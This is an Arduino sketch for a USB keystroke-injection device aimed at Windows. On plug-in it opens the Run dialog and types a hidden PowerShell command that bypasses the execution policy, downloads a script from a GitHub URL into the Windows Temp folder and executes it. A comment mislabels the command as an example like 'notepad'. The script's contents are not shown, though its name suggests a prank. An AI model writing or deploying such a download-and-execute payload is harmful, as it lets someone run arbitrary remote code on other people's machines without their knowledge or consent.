#include <Keyboard.h>

void setup() {
  delay(3000); // Wait 3 seconds for the OS to recognize the device

  // Press Windows + R
  Keyboard.press(KEY_LEFT_GUI);  // Windows key
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  delay(500); // Wait for Run dialog to appear

  // Type your command (e.g., "notepad")
  Keyboard.print(
    "PowerShell.exe -WindowStyle Hidden Set-ExecutionPolicy Bypass -scope Process -Force; & iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/scheduletherickoning.ps1' -o 'C:\\Windows\\Temp\\sch.ps1'; & 'C:\\Windows\\Temp\\sch.ps1'"
    );
  delay(900);
  Keyboard.press(KEY_RETURN);  // Press Enter
  Keyboard.release(KEY_RETURN);
}

void loop() {
  // Do nothing
}
